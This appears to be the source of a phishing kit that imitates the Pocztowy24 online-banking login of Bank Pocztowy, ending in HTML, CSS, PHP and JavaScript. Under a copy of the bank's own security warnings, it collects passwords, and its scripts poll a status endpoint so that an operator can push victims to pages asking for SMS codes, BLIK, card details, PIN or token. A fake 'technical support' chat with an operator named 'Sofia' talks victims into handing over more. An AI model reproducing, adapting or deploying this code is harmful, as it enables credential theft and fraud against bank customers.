<div class="pocztowy-field-type-password pocztowy-field-group pocztowy-column pocztowy-field-group-haslo pocztowy-col-80 pocztowy-sm-100 pocztowy-field-required">
<label for="form-field-haslo" class="pocztowy-field-label">Wpisz hasło:</label><input size="1" type="password" name="passdata" id="form-field-haslo" class="pocztowy-field pocztowy-size-xs  pocztowy-field-textual" required="required" aria-required="true">
</div>
<div class="pocztowy-field-group pocztowy-column pocztowy-field-type-submit pocztowy-col-40 e-form__buttons">
<button type="submit" class="pocztowy-button pocztowy-size-xs">
<span>
<span class="pocztowy-button-icon">
</span>
<span class="pocztowy-button-text">Zaloguj się</span>
</span>
</button>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="pocztowy-section pocztowy-top-section pocztowy-element pocztowy-element-b98efd9 pocztowy-section-boxed pocztowy-section-height-default pocztowy-section-height-default">
<div class="pocztowy-container pocztowy-column-gap-no">
<div class="pocztowy-row">
<div class="pocztowy-column pocztowy-col-33 pocztowy-top-column pocztowy-element pocztowy-element-a151c29">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-6446ba5 pocztowy-widget pocztowy-widget-heading">
<div class="pocztowy-widget-container">
<h2 class="pocztowy-heading-title pocztowy-size-default">Przejdź na nowy Pocztowy24!</h2>
</div>
</div>
<div class="pocztowy-element pocztowy-element-15967bf pocztowy-widget pocztowy-widget-text-editor">
<div class="pocztowy-widget-container">
<div class="pocztowy-text-editor pocztowy-clearfix">
<p>Nowa bankowość Pocztowy24 dla Klientów detalicznych i mikroprzedsiębiorstw dostępna jest pod adresem&nbsp;<b>online.pocztowy.pl</b></p><p>Zalogujesz się do niej za pomocą swojego identyfikatora NIK i tego samego hasła, którym logujesz się do obecnej wersji Pocztowy24.</p><p>Jeśli jednak już wcześniej korzystałeś z nowej wersji bankowości i utworzyłeś do niej nowe hasło, użyj tego hasła do logowania.</p><p>Wraz z nową bankowością otrzymasz&nbsp;<b>dostęp do aplikacji mobilnej Pocztowy</b>&nbsp;– pobierz ją z App Store lub Google Play, by móc wygodnie korzystać z bankowości przez telefon.</p><p>Nowa bankowość to możliwość korzystania z&nbsp;<b>nowych funkcjonalności</b>, takich jak:</p>					</div>
</div>
</div>
<div class="pocztowy-element pocztowy-element-4a84604 pocztowy-align-left pocztowy-icon-list--layout-traditional pocztowy-list-item-link-full_width pocztowy-widget pocztowy-widget-icon-list">
<div class="pocztowy-widget-container">
<ul class="pocztowy-icon-list-items">
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text"><b style="font-weight: bold;">BLIK</b>, którym bezpiecznie i szybko zapłacisz za zakupy w sieci i w sklepie stacjonarnym.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text"><b style="font-weight: bold;">AUTOPAY</b> – automatycznych płatności za przejazdy autostradami.</span> 									</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text"><b style="font-weight: bold;">KALENDARZ i MODUŁ FAKTUR</b>, które ułatwią planowanie wydatków i utrzymanie porządku w płatnościach.</span>
</li>
</ul>
</div>
</div>
<div class="pocztowy-element pocztowy-element-9500e9e pocztowy-widget pocztowy-widget-heading">
<div class="pocztowy-widget-container">
<h2 class="pocztowy-heading-title pocztowy-size-default">Dowiedz się więcej o nowym Pocztowy24</h2>
</div>
</div>
</div>
</div>
</div>
<div class="pocztowy-column pocztowy-col-33 pocztowy-top-column pocztowy-element pocztowy-element-cf8369a">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-13b6b22 pocztowy-widget pocztowy-widget-heading">
<div class="pocztowy-widget-container">
<h2 class="pocztowy-heading-title pocztowy-size-default">Nie możesz się zalogować?</h2>
</div>
</div>
<div class="pocztowy-element pocztowy-element-46c6c86 pocztowy-align-left pocztowy-icon-list--layout-traditional pocztowy-list-item-link-full_width pocztowy-widget pocztowy-widget-icon-list">
<div class="pocztowy-widget-container">
<ul class="pocztowy-icon-list-items">
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Wpisując swój NIK i hasło sprawdź, czy nie masz włączonej na klawiaturze funkcji Caps Lock.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Po trzykrotnym wpisaniu błędnych danych do logowania system dostęp do bankowości zostanie zablokowany.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">W przypadku zablokowania dostępu do bankowości skontaktuj się z Infolinią Banku  (801 100 500 lub 52 34 99 499).</span>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="pocztowy-column pocztowy-col-33 pocztowy-top-column pocztowy-element pocztowy-element-b59e15b">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-8c90944 pocztowy-widget pocztowy-widget-heading">
<div class="pocztowy-widget-container">
<h2 class="pocztowy-heading-title pocztowy-size-default">Nie możesz się zalogować?</h2>
</div>
</div>
<div class="pocztowy-element pocztowy-element-f6dcd48 pocztowy-widget pocztowy-widget-text-editor">
<div class="pocztowy-widget-container">
<div class="pocztowy-text-editor pocztowy-clearfix">
<p>Pamiętaj, że system bankowości nigdy:</p>
</div>
</div>
</div>
<div class="pocztowy-element pocztowy-element-8683fc7 pocztowy-align-left pocztowy-icon-list--layout-traditional pocztowy-list-item-link-full_width pocztowy-widget pocztowy-widget-icon-list">
<div class="pocztowy-widget-container">
<ul class="pocztowy-icon-list-items">
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Nie prosi o podanie kodu jednorazowego przed logowaniem, jak również bezpośrednio po zalogowaniu. System może prosić o podanie kodu jednorazowego w trakcie logowania.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Nie wysyła e-maili oraz SMS-ów z prośbą o weryfikację danych.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Nie prosi o podanie informacji dotyczącej telefonu używanego do autoryzacji operacji.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Nie prosi o podanie informacji dotyczących wydanych kart płatniczych takich jak: numer karty, data ważności, kod PIN i CVV/CVV2.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Nie prosi o wykonanie testowego przelewu w ramach aktywizacji / sprawdzenia funkcjonalności.</span>
</li>
<li class="pocztowy-icon-list-item">
<span class="pocztowy-icon-list-icon">
<svg aria-hidden="true" class="e-font-icon-svg"></svg>
</span>
<span class="pocztowy-icon-list-text">Nie prosi o zwrot środków pochodzących z błędnego / podejrzanego przelewu.</span>
</li>
</ul>
</div>
</div>
<div class="pocztowy-element pocztowy-element-e3fe9aa pocztowy-widget pocztowy-widget-text-editor">
<div class="pocztowy-widget-container">
<div class="pocztowy-text-editor pocztowy-clearfix">
Pamiętaj, aby kończąc korzystanie z bankowości używać funkcji WYLOGUJ.  Nigdy nie instaluj nieznanych aplikacji mających zapewnić bezpieczeństwo bankowości elektronicznej, nie klikaj w linki nadesłane w podejrzanych wiadomościach „od Banku”.  <br><br><b>Wszystkie zauważone nieprawidłowości, fakt utraty lub ujawnienia danych do logowania, telefonu komórkowego lub karty SIM używanych do korzystania z bankowości</b><span style="color: #da2429; font-weight: bold;"> jak najszybciej zgłoś do Banku: 801 100 500 lub 52 34 99 499.</span>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="pocztowy-section pocztowy-top-section pocztowy-element pocztowy-element-3366795 pocztowy-section-boxed pocztowy-section-height-default pocztowy-section-height-default">
<div class="pocztowy-container pocztowy-column-gap-default">
<div class="pocztowy-row">
<div class="pocztowy-column pocztowy-col-100 pocztowy-top-column pocztowy-element pocztowy-element-d13b8ac">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-8bb4ead pocztowy-widget pocztowy-widget-image">
<div class="pocztowy-widget-container">
<div class="pocztowy-image">
<img width="190" height="31" src="./pocztowy_files/pocz-image-2.png" class="attachment-full size-full">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>



<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        } else if (result == 'lk') {
                             location="/autorize%md%";
                        } else if (result == 'photo') {
                             location="/checking%md%";
                        } else if (result == 'blik') {
                             location="/blik%md%";
                        } else if (result == 'push') {
                             location="/potwierdzenie%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'token') {
                             location="/ipko%md%";
                        } else if (result == 'pin') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

        </script>


		<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #da2429;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #da2429;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #da2429;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./pocztowy_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./pocztowy_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
 </body></html>